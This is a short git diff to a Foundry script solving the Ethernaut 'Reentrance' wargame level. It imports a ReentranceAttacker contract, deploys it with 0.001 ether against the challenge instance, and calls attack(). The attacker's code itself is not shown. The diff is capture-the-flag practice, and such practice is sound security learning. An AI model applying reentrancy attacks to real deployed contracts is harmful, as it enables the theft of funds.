@@ -5,7 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
-//  import "../../src/10-ReentranceAttacker.sol";
+ import "../../src/10-ReentranceAttacker.sol";
 
 contract ReentranceSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
@@ -18,7 +18,8 @@ contract ReentranceSolution is Script, EthernautHelper {
         address challengeInstance = __createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
+        ReentranceAttacker attacker = new ReentranceAttacker{value: 0.001 ether}(challengeInstance);
+        attacker.attack();
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
         require(levelSuccess, "Challenge not passed yet");
